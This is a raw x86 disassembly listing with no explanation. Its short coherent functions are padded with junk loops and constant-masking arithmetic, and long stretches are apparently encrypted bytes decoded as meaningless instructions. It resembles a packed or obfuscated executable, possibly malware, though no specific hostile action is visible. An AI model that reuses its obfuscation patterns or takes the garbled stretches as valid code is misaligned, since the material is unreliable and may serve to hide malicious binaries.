  40e2e6:	or     bh,BYTE PTR [eax+ebp*8-0x3bac721]
  40e2ed:	xor    eax,0xaddb8cfc
  40e2f2:	or     al,0xce
  40e2f4:	jb     0x40e2d4
  40e2f6:	test   al,0x8e
  40e2f8:	jnp    0x40e2b3
  40e2fa:	fiadd  WORD PTR [ecx]
  40e2fc:	or     DWORD PTR [ebx+0x1da67144],edi
  40e302:	sub    BYTE PTR [ebp-0x7f4a3e56],al
  40e308:	and    edx,DWORD PTR [edi+0x8]
  40e30b:	retf   
  40e30c:	call   0x31bf3e85
  40e311:	and    eax,0x675f8cd5
  40e316:	push   esp
  40e317:	sti    
  40e318:	push   edi
  40e319:	add    bl,0xea
  40e31c:	xor    BYTE PTR [ebx],al
  40e31e:	shr    DWORD PTR [ebp-0x244fd970],cl
  40e324:	ins    BYTE PTR es:[edi],dx
  40e325:	and    BYTE PTR [ecx],ch
  40e327:	fscale 
  40e329:	pusha  
  40e32a:	test   eax,0xfcceddbf
  40e32f:	aam    0x7b
  40e331:	adc    ah,BYTE PTR [edx+0x4b]
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	call   DWORD PTR [edx-0x3d]
  40e3c1:	inc    ebp
  40e3c2:	data16 aas 
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3da
  40e3cc:	dec    esi
  40e3cd:	xlat   BYTE PTR ds:[ebx]
  40e3ce:	jmp    DWORD PTR [ebp+0x67]
  40e3d1:	inc    esi
  40e3d2:	dec    bl
  40e3d4:	mov    WORD PTR [ecx+ecx*1-0x22],ss
  40e3d8:	add    eax,0x96713ac6
  40e3dd:	lods   al,BYTE PTR ds:[esi]
  40e3de:	test   DWORD PTR [ebx-0x20],esp
  40e3e1:	pop    eax
  40e3e2:	adc    ch,ah
  40e3e4:	add    esi,edi
  40e3e6:	lea    edx,[ebx+eax*2]
  40e3e9:	push   ss
  40e3ea:	bound  edx,QWORD PTR [edx+0x111fab9c]
  40e3f0:	mov    ds:0x2fb18aee,eax
  40e3f5:	loop   0x40e420
  40e3f7:	data16 xor al,0x72
  40e3fa:	dec    edx
  40e3fb:	stos   DWORD PTR es:[edi],eax
  40e3fc:	cli    
  40e3fd:	push   ecx
  40e3fe:	xor    BYTE PTR [ebx-0x32],0x5f
  40e402:	pop    es
  40e403:	sub    BYTE PTR [ecx-0x123bd946],bl
  40e409:	ror    DWORD PTR [ebx],cl
  40e40b:	outs   dx,BYTE PTR ds:[esi]
  40e40c:	add    edx,DWORD PTR [esi]
  40e40e:	into   
  40e40f:	pop    esp
  40e410:	repnz xchg edi,eax
  40e412:	aam    0x82
  40e414:	out    dx,eax
  40e415:	cmp    eax,0x48e2f2f2
  40e41a:	fidivr WORD PTR [edi-0xbe5bd27]
  40e420:	out    dx,al
  40e421:	cdq    
  40e422:	mov    al,ds:0xc5ac0db7
  40e427:	daa    
  40e428:	add    BYTE PTR [ebx],0xd6
  40e42b:	outs   dx,BYTE PTR ds:[esi]
  40e42c:	mul    ecx
  40e42e:	in     eax,0x3b
  40e430:	rcr    dh,cl
  40e432:	and    DWORD PTR [edx+0x117b8905],ebp
  40e438:	lock repz and ah,BYTE PTR [eax]
  40e43c:	mov    ebx,0xa924b6c4
  40e441:	dec    edx
  40e442:	cmp    DWORD PTR [eax],0xc00f53e0
  40e448:	call   0xac35:0xf9f9f50c
  40e44f:	out    0x65,eax
  40e451:	cmp    al,0xc8
  40e453:	pop    ecx
  40e454:	fimul  DWORD PTR [bp+si-0x226e]
  40e459:	or     bh,bh
  40e45b:	mov    esi,ebp
  40e45d:	in     eax,dx
  40e45e:	loope  0x40e4b1
  40e460:	jbe    0x40e3f5
  40e462:	aaa    
  40e463:	pop    ebp
  40e464:	loop   0x40e3fc
  40e466:	mov    edx,ds
  40e468:	inc    esi
  40e469:	adc    ah,bl
  40e46b:	adc    esp,DWORD PTR [edx+0x4d96961b]
  40e471:	mov    al,ds:0x8d03356b
  40e476:	mov    WORD PTR ds:0x357dae40,gs
  40e47c:	mov    ebx,ds
  40e47e:	mov    eax,ds:0xafef1ab5
  40e483:	cmp    al,0xf7
  40e485:	shl    dl,0x6d
  40e488:	sbb    eax,0x7461af01
  40e48d:	(bad)  
  40e48e:	mov    eax,ds:0x9a98e664
  40e493:	leave  
  40e494:	dec    edx
  40e495:	or     DWORD PTR [edx-0x6f4e53ff],eax
  40e49b:	call   0xed09:0x5ca9de16
  40e4a2:	inc    ebx
  40e4a3:	xchg   ebx,eax
  40e4a4:	pushf  
  40e4a5:	ret    
  40e4a6:	int    0x4d
  40e4a8:	jnp    0x40e443
  40e4aa:	dec    ebx
  40e4ac:	std    
  40e4ad:	out    dx,al
  40e4ae:	mov    dl,0x26
  40e4b0:	mov    esp,edx
  40e4b2:	xor    eax,0xcb773dbd
  40e4b7:	stos   BYTE PTR es:[edi],al
  40e4b8:	ret    0x68e3
  40e4bb:	push   esp
  40e4bc:	or     BYTE PTR [ebp+ecx*2+0x232a5915],dh
  40e4c3:	push   esi
  40e4c4:	mov    dh,0x97
  40e4c6:	or     ebx,ecx
  40e4c8:	mov    esi,0x3990e8c8
  40e4cd:	and    ch,0x48
  40e4d0:	repz jb 0x40e49a
  40e4d3:	hlt    
  40e4d4:	xor    ah,BYTE PTR [eax-0xd]
  40e4d7:	ret    0x8549
  40e4da:	mov    eax,ds:0x1fa840f
  40e4df:	add    BYTE PTR [eax],al
  40e4e1:	add    DWORD PTR ds:0x433833,0x32bd
  40e4eb:	mov    eax,DWORD PTR [ebp-0x4]
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x54589328
  40e5c1:	mov    eax,0x7ea5cfe1
  40e5c6:	jle    0x40e5d6
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e560
  40e5cc:	popf   
  40e5cd:	or     BYTE PTR [edx+0x4f303ad8],dl
  40e5d3:	mov    eax,ds:0x58ec09d7
  40e5d8:	test   DWORD PTR ds:0xcd6a3014,ecx
  40e5de:	test   bl,bh
  40e5e0:	adc    DWORD PTR [ecx-0x4dbf6084],0x5891a299
  40e5ea:	cmp    eax,0xef73d981
  40e5ef:	lar    edi,WORD PTR [edx+eiz*2-0x65]
  40e5f4:	(bad)  
  40e5f5:	adc    dl,ah
  40e5f7:	or     ebp,DWORD PTR [edi+0x290acdc2]
  40e5fd:	rcr    DWORD PTR [ebx+0x79],1
  40e600:	mov    edx,0x678fd1d
  40e605:	cmp    al,0xcb
  40e607:	daa    
  40e608:	dec    edx
  40e609:	dec    ecx
  40e60a:	test   DWORD PTR [ebx+0x23],ebp
  40e60d:	xor    al,0xe0
  40e60f:	pop    ss
  40e610:	ja     0x40e5f1
  40e612:	inc    edx
  40e613:	push   ss
  40e614:	cmp    eax,0x9d9b4f66
  40e619:	cmp    DWORD PTR [edi+esi*2+0x58529715],esi
  40e620:	inc    edi
  40e621:	and    edi,esp
  40e623:	sub    bh,BYTE PTR [ecx-0x5ce844d7]
  40e629:	lock pop ecx
  40e62b:	dec    edi
  40e62c:	xlat   BYTE PTR ds:[ebx]
  40e62d:	dec    eax
  40e62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e62f:	add    BYTE PTR [edi+0x36],cl
  40e632:	jnp    0x40e61f
  40e634:	imul   ebx,eax,0x9a834031
  40e63a:	mov    ds:0xcb535394,eax
  40e63f:	inc    ebx
  40e640:	and    dl,BYTE PTR [ebx+0x4a]
  40e643:	cmp    al,dh
  40e645:	cli    
  40e646:	inc    edx
  40e647:	cmc    
  40e648:	fstp   TBYTE PTR [edx-0x7ce836ce]
  40e64e:	call   0x2672a4bf
  40e653:	cmp    ah,BYTE PTR [edi]
  40e655:	ret    0xc642
  40e658:	retf   0x840d
  40e65b:	mov    ebx,0x9025ab20
  40e660:	es aas 
  40e662:	jb     0x40e642
  40e664:	mov    esi,0x1be65d9c
  40e669:	mov    BYTE PTR [esi+0x8d48353],cl
  40e66f:	xchg   ebp,eax
  40e670:	xor    eax,0x845ad56b
  40e675:	std    
  40e676:	test   BYTE PTR [edx],ch
  40e678:	out    dx,al
  40e679:	mov    al,bl
  40e67b:	mov    ds:0x74ca2a1,al
  40e680:	leave  
  40e681:	xchg   esp,eax
  40e682:	daa    
  40e683:	inc    esi
  40e684:	mov    al,ds:0xede79e4
  40e689:	inc    eax
  40e68a:	mov    cl,0x5d
  40e68c:	dec    ecx
  40e68d:	xor    ch,al
  40e68f:	outs   dx,BYTE PTR ds:[esi]
  40e690:	xchg   edi,eax
  40e691:	mov    cl,0xb
  40e693:	lahf   
  40e694:	xchg   edx,eax
  40e695:	cmp    al,0x68
  40e697:	xchg   ecx,eax
  40e698:	inc    eax
  40e699:	arpl   WORD PTR [esi],cx
  40e69b:	mov    bh,0x83
  40e69d:	xchg   esp,eax
  40e69e:	ss mov eax,0x83479b80
  40e6a4:	loope  0x40e67e
  40e6a6:	les    ecx,FWORD PTR [ebx+edx*1-0x19]
  40e6aa:	jo     0x40e64c
  40e6ac:	cdq    
  40e6ad:	je     0x40e637
  40e6af:	xor    edi,edx
  40e6b1:	jecxz  0x40e65c
  40e6b3:	push   ss
  40e6b4:	(bad)  
  40e6b5:	jl     0x40e65b
  40e6b7:	in     eax,0x96
  40e6b9:	add    bh,BYTE PTR [eax-0x4c]
  40e6bc:	int3   
  40e6bd:	sub    edi,edi
  40e6bf:	ret    0x35ae
  40e6c2:	inc    ebx
  40e6c3:	mov    ds:0xa5785191,al
  40e6c8:	mov    ds:0x82fddeb5,eax
  40e6cd:	out    dx,eax
  40e6ce:	ins    DWORD PTR es:[edi],dx
  40e6cf:	add    eax,0x8caaf1fb
  40e6d4:	jae    0x40e65c
  40e6d6:	out    0x18,eax
  40e6d8:	xchg   esp,eax
  40e6d9:	xor    ah,BYTE PTR [esi-0x7403ba75]
  40e6df:	dec    ebp
  40e6e0:	adc    BYTE PTR [ebx],dh
  40e6e2:	mov    DWORD PTR [ebx],0xfc13bc6
  40e6e8:	test   DWORD PTR [eax+0x1],edx
  40e6eb:	add    BYTE PTR [eax],al
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x897a30a1
  40e707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e708:	or     ebx,edi
  40e70a:	mov    ds:0x7f0e7e7e,al
  40e70f:	jle    0x40e78f
  40e711:	or     bl,dl
  40e713:	adc    BYTE PTR [ebp+0x58023d2c],0xc1
  40e71a:	fisttp WORD PTR [ebx]
  40e71c:	loopne 0x40e6cc
  40e71e:	cli    
  40e71f:	in     al,0x74
  40e721:	and    esi,ebx
  40e723:	push   ds
  40e724:	enter  0x251f,0x7e
  40e728:	popa   
  40e729:	jp     0x40e73f
  40e72b:	jns    0x40e6ba
  40e72d:	jge    0x40e74d
  40e72f:	cmp    eax,0xb4aa82c8
  40e734:	pushf  
  40e735:	push   esi
  40e736:	push   ds
  40e737:	and    BYTE PTR [esi-0x6ca1ca01],0xf3
  40e73e:	int    0xfc
  40e740:	ins    DWORD PTR es:[edi],dx
  40e741:	aad    0x3b
  40e743:	es ins BYTE PTR es:[edi],dx
  40e745:	and    DWORD PTR [ecx-0x58b86eb6],ebx
  40e74b:	out    dx,al
  40e74c:	xchg   DWORD PTR [ebp+esi*8+0x5d],ebx
  40e750:	sub    al,0x52
  40e752:	popf   
  40e753:	sbb    BYTE PTR [edx],cl
  40e755:	xchg   esp,eax
  40e756:	es pop ss
  40e758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e759:	push   cs
  40e75a:	jmp    0x559b:0x3239597c
  40e761:	sub    DWORD PTR [ecx],edi
  40e763:	loop   0x40e73c
  40e765:	cmp    eax,0xbe03ff38
  40e76a:	jle    0x40e7ca
  40e76c:	dec    edi
  40e76d:	sbb    DWORD PTR [ecx+0x6a508b7a],edi
  40e773:	repnz std 
  40e775:	ins    BYTE PTR es:[edi],dx
  40e776:	stos   DWORD PTR es:[edi],eax
  40e777:	sub    al,0xa5
  40e779:	inc    ebx
  40e77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e77b:	sbb    edi,DWORD PTR [ebp+0x4c]
  40e77e:	div    DWORD PTR [ebp+0x64]
  40e781:	adc    eax,0x23133182
  40e786:	sub    eax,0x7c42eb0d
  40e78b:	push   ds
  40e78c:	(bad)  
  40e78d:	and    DWORD PTR es:[edx+eiz*4],ebp
  40e791:	adc    ch,BYTE PTR [ebx]
  40e793:	stos   BYTE PTR es:[edi],al
  40e794:	dec    esp
  40e795:	adc    edx,0xfffffffc
  40e798:	enter  0xa2b0,0x2
  40e79c:	pop    ebx
  40e79d:	push   esp
  40e79e:	int    0x98
  40e7a0:	dec    ecx
  40e7a1:	dec    ebx
  40e7a2:	push   0xffffffa5
  40e7a4:	fucomip st,st(1)
  40e7a6:	push   eax
  40e7a7:	and    ebp,DWORD PTR [eax]
  40e7a9:	clc    
  40e7aa:	mov    ds:0xdf38e5b0,eax
  40e7af:	and    al,0x36
  40e7b1:	imul   ebp,esp,0xc4f9cf60
  40e7b7:	shl    DWORD PTR [eax+0x7b],1
  40e7ba:	sub    al,0x45
  40e7bc:	adc    bl,BYTE PTR [ecx-0x47]
  40e7bf:	jmp    0x877c4b96
  40e7c4:	mov    dl,0xa6
  40e7c6:	push   eax
  40e7c7:	dec    DWORD PTR [ebp+0x19]
  40e7ca:	mov    BYTE PTR [ebx-0x7f1982e1],dh
  40e7d0:	ds retf 
  40e7d2:	push   es
  40e7d3:	jl     0x40e7b8
  40e7d5:	test   al,0xbc
  40e7d7:	xor    eax,0x431dba19
  40e7dc:	(bad)  
  40e7dd:	mov    esi,0x67b71aa8
  40e7e2:	ss pop ss
  40e7e4:	popa   
  40e7e5:	mov    ebp,fs
  40e7e7:	dec    esi
  40e7e8:	ins    BYTE PTR es:[edi],dx
  40e7e9:	xchg   ecx,eax
  40e7ea:	and    al,al
  40e7ec:	xchg   ebx,eax
  40e7ed:	xlat   BYTE PTR ds:[ebx]
  40e7ee:	sar    ebx,0xf6
  40e7f1:	aad    0xc9
  40e7f3:	and    DWORD PTR [ebp-0x7f],edi
  40e7f6:	(bad)  
  40e7f7:	int    0x8b
  40e7f9:	cmp    edi,DWORD PTR [esi+0x5bdc0f86]
  40e7ff:	pop    ebx
  40e800:	mov    ah,0x3c
  40e802:	inc    ebx
  40e803:	or     al,0x28
  40e805:	push   esi
  40e806:	push   eax
  40e807:	ret    0x5040
  40e80a:	aad    0x9e
  40e80c:	adc    cl,cl
  40e80e:	call   0x170b:0x90b6167d
  40e815:	mov    al,ds:0x5b7b0e97
  40e81a:	cmp    esp,0xdb9b696a
  40e820:	sahf   
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x1f103a68,al
  40ea30:	and    ebx,edx
  40ea32:	sbb    ebp,edi
  40ea34:	mov    ds:0x7c0e7e7e,eax
  40ea39:	jle    0x40eab9
  40ea3b:	jae    0x40ea1f
  40ea3d:	cmovg  ebx,DWORD PTR [eax]
  40ea40:	pushf  
  40ea41:	stc    
  40ea42:	pop    esi
  40ea43:	inc    ebp
  40ea44:	outs   dx,DWORD PTR ds:[esi]
  40ea45:	push   edi
  40ea46:	cld    
  40ea47:	jp     0x40ea47
  40ea49:	mov    ds:0xf016fb03,eax
  40ea4e:	xchg   esp,eax
  40ea4f:	push   esp
  40ea50:	add    DWORD PTR [ebx+0xae80a1c],edi
  40ea56:	scas   eax,DWORD PTR es:[edi]
  40ea57:	into   
  40ea58:	sahf   
  40ea59:	inc    edx
  40ea5a:	pop    edx
  40ea5b:	mov    esp,0x8050cae3
  40ea60:	dec    ebp
  40ea61:	jo     0x40eac4
  40ea63:	xchg   ebx,eax
  40ea64:	cdq    
  40ea65:	inc    esp
  40ea66:	dec    edx
  40ea67:	jp     0x40ead1
  40ea69:	and    BYTE PTR [ebx+0x1f148910],dl
  40ea6f:	ja     0x40ead1
  40ea71:	and    BYTE PTR [ebp+0x36f04192],cl
  40ea77:	adc    eax,0x25c49679
  40ea7c:	test   al,0x6c
  40ea7e:	(bad)  
  40ea7f:	js     0x40ea11
  40ea81:	popf   
  40ea82:	jmp    0x2f4cff78
  40ea87:	hlt    
  40ea88:	push   es
  40ea89:	hlt    
  40ea8a:	int    0x71
  40ea8c:	sbb    ah,BYTE PTR [eax]
  40ea8e:	xchg   esi,eax
  40ea8f:	mov    eax,ds:0xd0c90a82
  40ea94:	pop    ecx
  40ea95:	int3   
  40ea96:	lds    eax,FWORD PTR [ebx-0x4dae4ce0]
  40ea9c:	mov    esp,0xa23320db
  40eaa1:	jecxz  0x40ea8b
  40eaa3:	dec    edx
  40eaa4:	int    0x3a
  40eaa6:	(bad)
  40eaaa:	cmp    edi,DWORD PTR [esi+ebx*1]
  40eaad:	adc    al,0xd3
  40eaaf:	xor    eax,DWORD PTR [ebp-0x25]
  40eab2:	xchg   esi,eax
  40eab3:	mov    al,0x38
  40eab5:	push   es
  40eab6:	out    dx,eax
  40eab7:	dec    esi
  40eab8:	not    DWORD PTR [edx-0x4cb446ee]
  40eabe:	cli    
  40eabf:	addr16 mov ch,0x69
  40eac2:	or     DWORD PTR gs:[eax],edx
  40eac5:	aas    
  40eac6:	je     0x40eaf4
  40eac8:	clc    
  40eac9:	das    
  40eaca:	mov    eax,0x55e60ce7
  40eacf:	mov    ebx,0x76d44968
  40ead4:	fsub   DWORD PTR [eax+0x69644ef4]
  40eada:	mov    edx,0x6ae7ecb8
  40eadf:	jmp    0x40ea6f
  40eae1:	mov    ds:0x9d6482aa,eax
  40eae6:	in     al,0x3c
  40eae8:	push   edx
  40eae9:	(bad)  [ecx+esi*4]
  40eaec:	cmc    
  40eaed:	xor    eax,0xd78283f5
  40eaf2:	xchg   ecx,eax
  40eaf3:	test   DWORD PTR [eax-0x20],ecx
  40eaf6:	push   ebp
  40eaf7:	stos   DWORD PTR es:[edi],eax
  40eaf8:	or     al,0xeb
  40eafa:	in     al,dx
  40eafb:	lods   al,BYTE PTR ds:[esi]
  40eafc:	repz jae 0x40ead4
  40eaff:	inc    esi
  40eb00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb01:	xor    BYTE PTR [ecx-0x500db12f],ah
  40eb07:	sbb    eax,0xde8836af
  40eb0c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40eb0e:	and    al,0x22
  40eb10:	cmp    ch,BYTE PTR [eax+0x1d]
  40eb13:	pop    edi
  40eb14:	or     al,0x17
  40eb16:	mov    bh,0x58
  40eb18:	rcl    BYTE PTR [ebx+ebp*8],1
  40eb1b:	ds lahf 
  40eb1d:	repz dec eax
  40eb1f:	xchg   esp,eax
  40eb20:	mov    eax,0x2c5d2ba
  40eb25:	fwait
  40eb26:	adc    DWORD PTR [ecx+0x13],edx
  40eb29:	xchg   esp,edi
  40eb2b:	repz jmp 0x5f786cb1
  40eb31:	mov    dl,0xad
  40eb33:	mov    ds:0x8564e232,eax
  40eb38:	mov    ebp,0xb2565a7d
  40eb3d:	mov    cl,0xc8
  40eb3f:	int    0x2c
  40eb41:	out    dx,eax
  40eb42:	popf   
  40eb43:	or     DWORD PTR [eax],esi
  40eb45:	jnp    0x40eae2
  40eb47:	in     eax,dx
  40eb48:	sbb    BYTE PTR [ecx],dl
  40eb4a:	sub    bl,ah
  40eb4c:	lods   al,BYTE PTR ds:[esi]
  40eb4d:	inc    esp
  40eb4e:	mov    ds:0x4d4b2f67,al
  40eb53:	xor    al,0x50
  40eb55:	xchg   esp,eax
  40eb56:	iret   
  40eb57:	mov    ds,WORD PTR [esi]
  40eb59:	jb     0x40eae1
  40eb5b:	sahf   
  40eb5c:	dec    ebp
  40eb5d:	mov    bh,BYTE PTR [ecx-0x62e2ad7b]
  40eb63:	xchg   ebp,eax
  40eb64:	outs   dx,DWORD PTR ds:[esi]
  40eb65:	cs mov edx,0x372a3091
  40eb6b:	push   edx
  40eb6c:	je     0x40ebdd
  40eb6e:	xor    BYTE PTR [edx+0x3a9ff9f6],ch
  40eb74:	sub    DWORD PTR [eax],0x1880d27c
  40eb7a:	pop    esi
  40eb7b:	xor    BYTE PTR [eax-0x53],0x4a
  40eb7f:	mov    ?,WORD PTR [esp+ebp*4]
  40eb82:	bound  edi,QWORD PTR [edi+edx*2+0x649f7d83]
  40eb89:	fisttp WORD PTR [esi+0x273695f1]
  40eb8f:	jb     0x40ebdf
  40eb91:	xchg   BYTE PTR [ebx],cl
  40eb93:	in     eax,0x78
  40eb95:	fbstp  TBYTE PTR [eax*2+0x3dc6d6e1]
  40eb9c:	pop    ebx
  40eb9d:	cmp    al,0x11
  40eb9f:	arpl   WORD PTR [esi-0x7c52b311],di
  40eba5:	xchg   edx,eax
  40eba6:	ins    DWORD PTR es:[edi],dx
  40eba7:	sub    al,0x45
  40eba9:	sbb    eax,0xde06f9b3
  40ebae:	retf   
  40ebaf:	mov    edi,DWORD PTR [edi*4-0x3a55fbf2]
  40ebb6:	mov    bl,0xac
  40ebb8:	imul   edi,esp,0xffffffed
  40ebbb:	push   ebx
  40ebbc:	ins    DWORD PTR es:[edi],dx
  40ebbd:	cwde   
  40ebbe:	mov    DWORD PTR [ebp+0x15],ebp
